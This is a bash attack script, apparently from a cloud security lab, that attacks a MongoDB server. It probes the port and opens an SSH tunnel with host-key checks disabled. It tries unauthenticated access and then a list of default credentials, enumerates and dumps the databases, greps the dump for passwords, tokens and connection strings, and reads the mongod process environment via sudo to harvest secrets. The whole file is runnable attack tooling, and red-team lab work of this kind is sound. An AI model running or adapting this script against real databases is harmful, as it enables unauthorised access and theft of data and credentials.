#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# Attack 02 — MongoDB Unauthenticated Access & Data Dump
#
# MITRE ATT&CK : T1190 — Exploit Public-Facing Application
#                T1005 — Data from Local System
#                T1552 — Unsecured Credentials
#
# CVEs targeted : CVE-2019-2386 — MongoDB auth bypass in versions < 4.0.9
#                 CVE-2021-32040 — MongoDB DoS via crafted aggregation pipeline
set -euo pipefail

MONGO_IP="${1:-${MONGO_IP:?'Set MONGO_IP or pass as argument'}}"
MONGO_PORT="${MONGO_PORT:-27017}"
REPORT_DIR="$(dirname "$0")/../attack-output"
DUMP_DIR="$REPORT_DIR/02-mongo-dump"
mkdir -p "$REPORT_DIR" "$DUMP_DIR"

banner() { echo; echo "  ┌─ $*"; }
step()   { echo "  │  $*"; }
done_()  { echo "  └─ done"; echo; }

# ── 1. Check if MongoDB port is reachable ─────────────────────────────────────
banner "Phase 1: Probing MongoDB port $MONGO_PORT on $MONGO_IP"

if nc -z -w5 "$MONGO_IP" "$MONGO_PORT" 2>/dev/null; then
  step "✓ Port $MONGO_PORT is open and reachable from the internet"
  step "⚠️  MongoDB should NEVER be reachable from outside the VPC"
else
  step "Port $MONGO_PORT not directly reachable — trying via SSH tunnel"
  step "Establishing tunnel: localhost:27017 → $MONGO_IP:27017"
  ssh -f -N -L "27017:localhost:27017" \
      -o StrictHostKeyChecking=no \
      -i "${SSH_KEY_PATH:-~/.ssh/id_rsa}" \
      "${SSH_USER:-ubuntu}@$MONGO_IP" \
      2>/dev/null
  MONGO_IP="127.0.0.1"
  step "✓ Tunnel established — continuing via localhost"
fi
done_

# ── 2. Connect with no credentials ───────────────────────────────────────────
banner "Phase 2: Connecting to MongoDB without authentication"

step "Attempting unauthenticated connection..."
MONGO_RESULT=$(mongosh \
  --host "$MONGO_IP" \
  --port "$MONGO_PORT" \
  --quiet \
  --eval "db.adminCommand({listDatabases:1})" \
  2>/dev/null || echo "AUTH_REQUIRED")

if echo "$MONGO_RESULT" | grep -q "AUTH_REQUIRED"; then
  step "Auth required — trying default credentials (admin:admin, root:root)..."

  for CREDS in "admin:admin" "admin:password" "root:root" "mongoadmin:mongoadmin"; do
    USER="${CREDS%%:*}"
    PASS="${CREDS##*:}"
    ATTEMPT=$(mongosh \
      --host "$MONGO_IP" \
      --port "$MONGO_PORT" \
      --username "$USER" \
      --password "$PASS" \
      --authenticationDatabase admin \
      --quiet \
      --eval "db.adminCommand({listDatabases:1})" 2>/dev/null || echo "FAIL")

    if ! echo "$ATTEMPT" | grep -q "FAIL"; then
      step "✓ Authenticated with $USER:$PASS"
      MONGO_RESULT="$ATTEMPT"
      break
    fi
  done
else
  step "✓ Connected with NO credentials — authentication is disabled"
fi

echo "$MONGO_RESULT" | tee "$REPORT_DIR/02-databases.txt"
done_

# ── 3. Enumerate all databases and collections ────────────────────────────────
banner "Phase 3: Enumerating all databases and collections"

mongosh \
  --host "$MONGO_IP" \
  --port "$MONGO_PORT" \
  --quiet \
  --eval "
    const dbs = db.adminCommand({listDatabases:1}).databases;
    dbs.forEach(d => {
      if (['admin','local','config'].includes(d.name)) return;
      print('\\nDatabase: ' + d.name + ' (' + d.sizeOnDisk + ' bytes)');
      const conn = db.getSiblingDB(d.name);
      conn.getCollectionNames().forEach(c => {
        const count = conn[c].countDocuments();
        print('  Collection: ' + c + ' (' + count + ' documents)');
      });
    });
  " 2>/dev/null | tee "$REPORT_DIR/02-collections.txt"

done_

# ── 4. Dump application data ──────────────────────────────────────────────────
banner "Phase 4: Dumping application database — looking for credentials"

DB_NAME="${MONGO_DB:-wizlab}"

step "Dumping database: $DB_NAME"
mongodump \
  --host "$MONGO_IP" \
  --port "$MONGO_PORT" \
  --db "$DB_NAME" \
  --out "$DUMP_DIR" \
  --quiet 2>/dev/null

step "Dump complete → $DUMP_DIR"
step "Searching dump for secrets..."

# Search for credentials and sensitive patterns in the dump
grep -rniE \
  "password|passwd|secret|token|apikey|api_key|mongodb://|connectionstring" \
  "$DUMP_DIR" 2>/dev/null \
  | tee "$REPORT_DIR/02-credentials-found.txt" \
  || step "No plaintext credentials found in documents (may be encoded)"

done_

# ── 5. Extract connection string from process environment ─────────────────────
banner "Phase 5: Checking MongoDB process for hardcoded connection strings"

step "Reading /proc environment of the mongod process (requires VM access)..."
ssh -o StrictHostKeyChecking=no \
    -o BatchMode=yes \
    -i "${SSH_KEY_PATH:-~/.ssh/id_rsa}" \
    "${SSH_USER:-ubuntu}@${MONGO_IP}" \
    "sudo cat /proc/\$(pgrep mongod)/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'password|secret|key|uri'" \
    2>/dev/null | tee "$REPORT_DIR/02-process-env.txt" \
    || step "Could not read process environment — needs direct VM access"

done_

echo "  Attack 02 complete."
echo "  Findings:"
echo "    → Database contents dumped to: $DUMP_DIR"
echo "    → Potential credentials:       $REPORT_DIR/02-credentials-found.txt"
echo "  Next step: run attacks/03-gcs-bucket-exfil.sh"
